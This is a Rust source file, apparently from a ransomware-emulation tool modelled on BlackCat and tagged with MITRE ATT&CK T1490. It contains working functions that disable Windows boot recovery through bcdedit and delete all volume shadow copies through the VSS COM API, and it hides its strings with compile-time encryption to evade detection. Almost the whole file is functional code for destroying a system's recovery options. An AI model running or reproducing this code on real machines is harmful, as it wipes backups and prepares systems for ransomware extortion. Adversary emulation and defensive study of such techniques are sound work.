#![cfg(target_os = "windows")]

use std::error::Error;
use std::str;
use crate::proc::exec_program;
use crate::logger::{log_info, log_debug, log_error};
use encryptliterals::esl;

// Delete Shadow Copy
use std::ptr::null_mut;
use std::mem::zeroed;
use winapi::{
    shared::{
        rpcdce::{
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE
        },
        winerror::{
            S_OK,
            S_FALSE,
            E_ACCESSDENIED,
            E_INVALIDARG,
            RPC_E_TOO_LATE
        }
    },
    um::{
        cguid::GUID_NULL,
        combaseapi::{
            CoInitializeEx,
            CoInitializeSecurity,
            COINITBASE_MULTITHREADED
        },
        objidl::EOAC_DYNAMIC_CLOAKING,
        vsbackup::{
            IVssBackupComponents,
            CreateVssBackupComponents,
        },
        vss::{
            IVssEnumObject,
            VSS_BT_FULL,
            VSS_CTX_ALL,
            VSS_OBJECT_PROP,
            VSS_SNAPSHOT_PROP,
            VSS_OBJECT_NONE,
            VSS_OBJECT_SNAPSHOT,
        },
        winnt::HRESULT
    }
};

/**
 * disable_bootloader_recovery
 *      About:
 *          Disables bootloader recovery using bcdedit: 
 *              bcdedit /set {default} recoveryenabled no
 *      Result:
 *          Disable bootloader recovery or error should bcdedit fail.
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *      CTI:
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
 */
pub fn disable_bootloader_recovery() -> Result<(), Box<dyn Error>> {
    match exec_program(esl!("bcdedit").as_str(), &[esl!("/set").as_str(), esl!("{default}").as_str(), esl!("recoveryenabled").as_str(), esl!("no").as_str()]) {
        Ok(output) => {
            let stdout = str::from_utf8(&output.stdout)?;
            let stderr = str::from_utf8(&output.stderr)?;
            log_debug(format!("{}: {}", esl!("bcdedit stdout"), stdout));
            log_debug(format!("{}: {}", esl!("bcdedit stderr"), stderr));
        },
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute bcdedit /set {{default}} recoveryenabled no"), e))?
        }
    };

    Ok(())
}

/**
 * delete_shadow_copies
 *      About:
 *          Deletes shadow copies using Windows API calls.
 *      Result:
 *          Delete shadow copies, or return error upon failure.
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
 *          https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/
 *      Referenced Code: https://github.com/mttaggart/corrodedshadow
 */
pub fn delete_shadow_copies() -> Result<(), Box<dyn Error>> {
    unsafe {
        let mut p_backup_components: *mut IVssBackupComponents = null_mut();
        let mut p_enum_object: *mut IVssEnumObject = null_mut();
        let mut prop: VSS_OBJECT_PROP = zeroed();

        log_debug(String::from(esl!("Initializing COM")));
        let mut hr: HRESULT = CoInitializeEx(null_mut(), COINITBASE_MULTITHREADED);
        match hr {
            S_OK => {
                log_debug(String::from(esl!("Initialized COM")));
            },
            S_FALSE => {
                // Required for the second time delete_shadow_copies is called,
                // as CoIntializeEx will return S_FALSE if COM was previously
                // intialized on the current thread. 
                //
                // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializeex
                log_info(String::from(esl!("COM is already intialized on this thread")));
            }
            _ => {
                Err(format!("{} {}", esl!("Failed to intialize COM:"), hr))?
            }
        };

        log_debug(String::from(esl!("Initializing COM security")));
        hr = CoInitializeSecurity(
            null_mut(),
            -1,
            null_mut(),
            null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            null_mut(),
            EOAC_DYNAMIC_CLOAKING, 
            null_mut()
        );
        match hr {
            S_OK => {
                log_debug(String::from(esl!("Initialized COM security")));
            },
            RPC_E_TOO_LATE => {
                // Required for the second time delete_shadow_copies is called,
                // as CoIntializeSecurity will return RPC_E_TOO_LATE if COM was
                // previously intialized on the current thread. 
                //
                // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity
                log_info(String::from(esl!("COM security is already intialized within this thread")));
            }
            _ => {
                Err(format!("{}: {}", esl!("Failed to intialize COM security"), hr))?
            }
        };

        log_debug(String::from(esl!("Creating backup components")));
        hr = CreateVssBackupComponents(&mut p_backup_components);
        match hr {
            S_OK => {
                log_debug(String::from(esl!("Created backup components")));
            },
            E_ACCESSDENIED => {
                Err(format!("{}: {}", esl!("Access denied when creating backup components (are you admin?)"), hr))?
            }
            _ => {
                Err(format!("{}: {}", esl!("Failed to create backup components"), hr))?
            }
        };
        let backup_components = &*p_backup_components;


        log_debug(String::from(esl!("Initializing for backup")));
        hr = backup_components.InitializeForBackup(0 as *mut u16);
        match hr {
            S_OK => {
                log_debug(String::from(esl!("Initialized for backup")));
            },
            _ => {
                Err(format!("{}: {}", esl!("Failed to intialize for backup"), hr))?
            }
        };

        log_debug(String::from(esl!("Setting context")));
        hr = backup_components.SetContext(VSS_CTX_ALL as i32);
        match hr {
            S_OK => {
                log_debug(String::from(esl!("Context set")));
            },
            _ => {
                Err(format!("{}: {}", esl!("Failed to set context"), hr))?
            }
        };

        log_debug(String::from(esl!("Setting backup state")));
        hr = backup_components.SetBackupState(
            true,
            true,
            VSS_BT_FULL,
            false
        );
        match hr {
            S_OK => {
                log_debug(String::from(esl!("Backup state set")));
            },
            _ => {
                Err(format!("{}: {}", esl!("Failed to set backup state"), hr))?
            }
        };

        log_debug(String::from(esl!("Querying for snapshots")));

        hr = backup_components.Query(
            GUID_NULL, 
            VSS_OBJECT_NONE, 
            VSS_OBJECT_SNAPSHOT, 
            &mut p_enum_object
        );

        match hr {
            S_OK => {
                log_debug(String::from(esl!("Snapshots queried")));
            },
            E_INVALIDARG => {
                Err(format!("{}: {}", esl!("Invalid argument while querying snapshots"), hr))?
            }
            S_FALSE => {
                // https://github.com/MicrosoftDocs/SupportArticles-docs/blob/main/support/windows-hardware/drivers/ivssbackupcomponents-returns-value-0x1.md
                log_info(String::from(esl!("Query returned S_FALSE, possibly no volume shadow copies present")));
                return Ok(());
            }
            _ => {
                Err(format!("{}: {}", esl!("Failed to query snapshots"), hr))?
            }
        }
        let enum_object = &*p_enum_object;

        log_debug(String::from(esl!("Fetching shadows")));

        let mut fetched: u32 = 0;

        loop {
            hr = enum_object.Next(
                1, 
                &mut prop, 
                &mut fetched
            ); 

            match hr {
                S_OK => {
                    log_debug(String::from(esl!("Snapshot queried")));
                    // Get Snapshot Info
                    let snap: &mut VSS_SNAPSHOT_PROP = prop.Obj.Snap_mut();
        
                    log_info(
                        format!(
                        "{}: {:?}{:?}{:?}", 
                        esl!("Snapshot"),
                        snap.m_SnapshotId.Data1,
                        snap.m_SnapshotId.Data2,
                        snap.m_SnapshotId.Data3
                    ));

                    let mut deleted_snapshots = 0;
                    let mut non_deleted_snapshot_id = GUID_NULL;

                    log_info(String::from(esl!("Deleting snapshot")));
                    hr = backup_components.DeleteSnapshots(
                        snap.m_SnapshotId,
                        VSS_OBJECT_SNAPSHOT,
                        1,
                        &mut deleted_snapshots, 
                        &mut non_deleted_snapshot_id
                    );

                    match hr {
                        S_OK => {
                            log_info(String::from(esl!("Deleted snapshot")));
                        },
                        _ => {
                            log_error(
                                format!(
                                "{}: {:?}{:?}{:?}", 
                                esl!("Failed to delete snapshot"),
                                snap.m_SnapshotId.Data1,
                                snap.m_SnapshotId.Data2,
                                snap.m_SnapshotId.Data3
                            ));
                        }
                    };
                },
                E_INVALIDARG => {
                    Err(format!("{}: {}", esl!("Invalid argument when iterating snapshots"), hr))?
                },
                _ => {
                    log_debug(String::from(esl!("Finished processing Shadow Copies.")));
                    return Ok(());
                }
            }
        }    
    }
}
